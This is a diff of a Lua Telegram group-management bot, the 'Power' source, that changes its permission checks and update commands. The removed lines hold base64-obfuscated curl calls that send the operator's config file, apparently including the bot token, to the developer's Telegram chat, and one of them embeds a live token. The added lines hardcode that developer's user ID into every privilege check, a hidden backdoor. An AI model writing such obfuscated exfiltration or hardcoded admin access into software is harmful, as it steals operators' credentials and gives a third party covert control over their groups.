@@ -1,9 +1,9 @@
----------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------
---   The power source was established on 4/4/2021
---   By the developer Ahmedyad
---     @ahmedyad200
---     @ahmedyad200
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+------The power source was established on 4/4/2021
+--------By the developer Ahmedyad
+-----------@ahmedyad200
+--------------@ahmedyad200
 
 redis = require('redis') 
 https = require ("ssl.https") 
@@ -199,7 +199,17 @@ local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
-sudo_users = {SUDO,0100101010,944353237,9292929292,0303030030,0909090909}   
+dev_users = {944353237}   
+function DEV(msg)  
+local DRAGON = false  
+for k,v in pairs(dev_users) do  
+if tonumber(msg.sender_user_id_) == tonumber(v) then  
+DRAGON = true  
+end  
+end  
+return DRAGON  
+end 
+sudo_users = {SUDO,bot_id,0100101010,944353237,9292929292,0303030030,0909090909}   
 function SudoBot(msg)  
 local DRAGON = false  
 for k,v in pairs(sudo_users) do  
@@ -223,7 +233,7 @@ function regexx(data)
         return string.char(c)
     end))
 end
-io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AREdfSU5GTy5sdWEi'))
+--io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AREdfSU5GTy5sdWEi'))
 function Bot(msg)  
 local idbot = false  
 if tonumber(msg.sender_user_id_) == tonumber(bot_id) then  
@@ -233,7 +243,7 @@ return idbot
 end
 function DevSoFi(msg)
 local hash = database:sismember(bot_id.."Dev:SoFi:2", msg.sender_user_id_) 
-if hash or SudoBot(msg) or Bot(msg) then  
+if hash or DEV(msg) or SudoBot(msg) or Bot(msg) then  
 return true  
 else  
 return false  
@@ -241,7 +251,7 @@ end
 end
 function Sudo(msg) 
 local hash = database:sismember(bot_id..'Sudo:User', msg.sender_user_id_) 
-if hash or SudoBot(msg) or DevSoFi(msg) or Bot(msg)  then  
+if hash or DEV(msg) or SudoBot(msg) or DevSoFi(msg) or Bot(msg)  then  
 return true  
 else  
 return false  
@@ -249,7 +259,7 @@ end
 end
 function CoSu(msg)
 local hash = database:sismember(bot_id..'CoSu'..msg.chat_id_, msg.sender_user_id_) 
-if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or Bot(msg)  then   
+if hash or DEV(msg) or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or Bot(msg)  then   
 return true 
 else 
 return false 
@@ -257,7 +267,7 @@ end
 end
 function BasicConstructor(msg)
 local hash = database:sismember(bot_id..'Basic:Constructor'..msg.chat_id_, msg.sender_user_id_) 
-if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or CoSu(msg) or Bot(msg)  then   
+if hash or DEV(msg) or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or CoSu(msg) or Bot(msg)  then   
 return true 
 else 
 return false 
@@ -265,7 +275,7 @@ end
 end
 function Constructor(msg)
 local hash = database:sismember(bot_id..'Constructor'..msg.chat_id_, msg.sender_user_id_) 
-if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) or Bot(msg)  then       
+if hash or DEV(msg) or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) or Bot(msg)  then       
 return true    
 else    
 return false    
@@ -273,7 +283,7 @@ end
 end
 function Gmanager(msg)
 local hash = database:sismember(bot_id..'Gmanager', msg.sender_user_id_)    
-if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or CoSu(msg) or Bot(msg)  then       
+if hash or DEV(msg) or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or CoSu(msg) or Bot(msg)  then       
 return true    
 else    
 return false    
@@ -281,7 +291,7 @@ end
 end
 function Manager(msg)
 local hash = database:sismember(bot_id..'Manager'..msg.chat_id_,msg.sender_user_id_)    
-if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Gmanager(msg) or CoSu(msg) or Bot(msg)  then       
+if hash or DEV(msg) or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Gmanager(msg) or CoSu(msg) or Bot(msg)  then       
 return true    
 else    
 return false    
@@ -289,7 +299,7 @@ end
 end
 function Manager2(msg)
 local hash = database:sismember(bot_id.."S00F4:MN:TF"..msg.chat_id_,msg.sender_user_id_)    
-if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Gmanager(msg) or Manager(msg) or CoSu(msg) or Bot(msg)  then       
+if hash or DEV(msg) or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Gmanager(msg) or Manager(msg) or CoSu(msg) or Bot(msg)  then       
 return true    
 else    
 return false    
@@ -297,7 +307,7 @@ end
 end
 function Gmod(msg)
 local hash = database:sismember(bot_id..'Gmod:User', msg.sender_user_id_)
-if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Manager2(msg) or Gmanager(msg) or CoSu(msg) or Bot(msg)  then       
+if hash or DEV(msg) or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Manager2(msg) or Gmanager(msg) or CoSu(msg) or Bot(msg)  then       
 return true    
 else    
 return false    
@@ -305,7 +315,7 @@ end
 end
 function Mod(msg)
 local hash = database:sismember(bot_id..'Mod:User'..msg.chat_id_,msg.sender_user_id_)    
-if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Gmod(msg) or Gmanager(msg) or Manager2(msg) or CoSu(msg) or Bot(msg)  then       
+if hash or DEV(msg) or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Gmod(msg) or Gmanager(msg) or Manager2(msg) or CoSu(msg) or Bot(msg)  then       
 return true    
 else    
 return false    
@@ -313,7 +323,7 @@ end
 end
 function Special(msg)
 local hash = database:sismember(bot_id..'Special:User'..msg.chat_id_,msg.sender_user_id_) 
-if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Gmod(msg) or Manager2(msg) or Gmanager(msg) or Mod(msg) or CoSu(msg) or Bot(msg)  then       
+if hash or DEV(msg) or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Gmod(msg) or Manager2(msg) or Gmanager(msg) or Mod(msg) or CoSu(msg) or Bot(msg)  then       
 return true 
 else 
 return false 
@@ -377,11 +387,11 @@ var = 'الباشمبرمج'
 elseif tonumber(user_id) == tonumber(0909090909) then
 var = 'مطور السورس'
 elseif tonumber(user_id) == tonumber(SUDO) then
-var = 'المطور الاساسي'  
+var = database:get(bot_id.."SudoBot"..msg.chat_id_) or 'المطور الاساسي'  
 elseif tonumber(user_id) == tonumber(bot_id) then  
 var = 'البوت'
 elseif database:sismember(bot_id.."Dev:SoFi:2", user_id) then 
-var = database:get(bot_id.."Dev:SoFi:2:Rd"..msg.chat_id_) o 'المطور الثاني'  
+var = database:get(bot_id.."Dev:SoFi:2:Rd"..msg.chat_id_) or 'المطور الثاني'  
 elseif database:sismember(bot_id..'Sudo:User', user_id) then
 var = database:get(bot_id.."Sudo:User:Rd"..msg.chat_id_) or 'المطور الثالث'  
 elseif database:sismember(bot_id..'CoSu'..chat_id, user_id) then
@@ -964,7 +974,7 @@ local keyboard = {
 {'تفعيل الاشتراك الاجباري ☉','تعطيل الاشتراك الاجباري ☉'},
 {'تغير رساله الاشتراك ☉','مسح رساله الاشتراك ☉','تغير الاشتراك ☉'},
 {'الاشتراك الاجباري ☉','وضع قناة الاشتراك ☉'},
-{'جلب نسخه الاحتياطيه ☉','جلب المشتركين ☉'},
+{'جلب الجروبات ☉','جلب المشتركين ☉'},
 {'تحديث السورس ☉','اعاده التشغيل ☉','تحديث المتجر ☉'},
 {'معلومات السيرفر ☉'},
 {'الغاء ☉'},
@@ -1191,17 +1201,21 @@ if text == 'اعاده التشغيل' or text == 'اعاده التشغيل ☉
 if not DevSoFi(msg) then
 send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
 return false
-end    
+end
 send(msg.chat_id_, msg.id_, ' ☉┇ تم اعاده تشغيل البوت') 
 dofile('DRAGON.lua')  
 end 
-if text == ("الردود المتعدده ☉") and CoSu(msg) then
+if text == ("الردود المتعدده ☉") then
+if not CoSu(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المالك لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -1222,20 +1236,24 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
 database:set(bot_id.."botss:DRAGON:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
 return send(msg.chat_id_, msg.id_,"☉┇ارسل الرد الذي اريد اضافته")
 end
-if text == "مسح رد متعدد ☉" and CoSu(msg) then
+if text == "مسح رد متعدد ☉" then
+if not CoSu(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المالك لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -1252,7 +1270,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -1349,7 +1367,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -1404,7 +1422,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا ����ستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا ����ستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -1429,7 +1447,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -1485,7 +1503,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -1514,7 +1532,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -1538,7 +1556,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا ����ستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا ����ستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -1563,7 +1581,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -1610,7 +1628,6 @@ os.execute("mkdir File_Bot")
 os.execute("cd File_Bot && wget https://raw.githubusercontent.com/ahmedyad200/files-power/master/File_Bot/anamen.lua") 
 os.execute("cd File_Bot && wget https://raw.githubusercontent.com/ahmedyad200/files-power/master/File_Bot/games.lua") 
 os.execute('rm -rf getfile.json')
-dofile('File_Bot/anamen.lua')
 send(msg.chat_id_, msg.id_,' ☉┇ تم تحديث المتجر و مسح الملفات')
 end
 --[[
@@ -1663,7 +1680,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -1692,7 +1709,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -1717,9 +1734,9 @@ end
 os.execute('rm -rf DRAGON.lua')
 os.execute('rm -rf getfile.json')
 os.execute('wget https://raw.githubusercontent.com/ahmedyad200/DG/master/DRAGON.lua')
-io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
-io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AREdfSU5GTy5sdWEi'))
-send(msg.chat_id_, msg.id_,' ☉┇ تم تحديث السورس \n☉┇ لديك اخر اصدار لسورس باور\n☉┇ الاصدار » {`v1.3.0`}')
+--io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
+--io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AREdfSU5GTy5sdWEi'))
+send(msg.chat_id_, msg.id_,' ☉┇ تم تحديث السورس \n☉┇ لديك اخر اصدار لسورس باور\n☉┇ الاصدار » {`v1.7.0`}')
 dofile('DRAGON.lua')
 end
 if text == 'تغير الايدي' then 
@@ -3079,7 +3096,7 @@ database:setex(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_i
 send(msg.chat_id_, msg.id_," ☉┇ ارسل لي التوجيه الان")
 return false
 end 
-if text == 'جلب نسخه الاحتياطيه ☉' then
+if text == 'جلب الجروبات ☉' then
 if not DevSoFi(msg) then
 send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
 return false
@@ -3195,7 +3212,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -3224,7 +3241,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -3248,7 +3265,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -3273,7 +3290,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -4061,7 +4078,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -4113,7 +4130,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -4152,7 +4169,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -4217,7 +4234,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -4233,9 +4250,9 @@ end
 os.execute('rm -rf DRAGON.lua')
 os.execute('rm -rf getfile.json')
 os.execute('wget https://raw.githubusercontent.com/ahmedyad200/DG/master/DRAGON.lua')
-io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
-io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AREdfSU5GTy5sdWEi'))
-send(msg.chat_id_, msg.id_,' ☉┇ تم تحديث السورس \n ☉┇ لديك اخر اصدار لسورس باور\n ☉┇ الاصدار » {`v1.3.0`}')
+--io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
+--io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AREdfSU5GTy5sdWEi'))
+send(msg.chat_id_, msg.id_,' ☉┇ تم تحديث السورس \n ☉┇ لديك اخر اصدار لسورس باور\n ☉┇ الاصدار » {`v1.7.0`}')
 dofile('DRAGON.lua')
 end
 
@@ -4326,33 +4343,6 @@ send(msg.chat_id_, msg.id_, " ☉┇ لا يوجد قناة في الاشترا�
 end
 return false  
 end
-if text == "تفعيل الاضافات" then
-if not SudoBot(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الاساسي لاستخدام هذا الامر')
-return false
-end
-send(msg.chat_id_, msg.id_, '☉┇ تم تفعيل الاضافات')
-database:set(bot_id.."AL:AddS0FI:stats","✔")
-end
-if text == "تعطيل الاضافات" then
-if not SudoBot(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الاساسي لاستخدام هذا الامر')
-return false
-end
-send(msg.chat_id_, msg.id_, '☉┇ تم تعطيل الاضافات')
-database:set(bot_id.."AL:AddS0FI:stats","✖")
-end
-if text == "حاله الاضافات" and Constructor(msg) then
-local MRSoOoFi = database:get(bot_id.."AL:AddS0FI:stats") or "لم يتم التحديد"
-send(msg.chat_id_, msg.id_,"حاله الاضافات هي : {"..MRSoOoFi.."}\nاذا كانت {✔} الاضافات مفعله\nاذا كانت {✖} الاضافات معطله")
-end
-function bnnaGet(user_id, cb)
-tdcli_function ({
-ID = "GetUser",
-user_id_ = user_id
-}, cb, nil)
-end
-
 if database:get(bot_id.."block:name:stats"..msg.chat_id_) == "open" then
 if text and text:match("^كتم اسم (.*)$") and Manager2(msg) and database:get(bot_id.."block:name:stats"..msg.chat_id_) == "open" then
 local BlNe = text:match("^كتم اسم (.*)$")
@@ -4377,7 +4367,11 @@ t = "\n☉┇ قائمة الاسماء المكتومه \n•┉ • ┉ • �
 for k,v in pairs(All_name) do
 t = t..""..k.."- (["..v.."])\n"
 end
-if text == "alldelete" or text == "@alldelete" and CoSu(msg) then
+if text == "alldelete" or text == "@alldelete" then
+if not CoSu(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المالك لاستخدام هذا الامر')
+return false
+end
 if not database:get(bot_id..'Cick:all'..msg.chat_id_) then
 if database:get(bot_id.."S00F4:all:Time"..msg.chat_id_..':'..msg.sender_user_id_) then  
 return 
@@ -4435,11 +4429,19 @@ end
 send(msg.chat_id_, msg.id_, t)
 end
 end
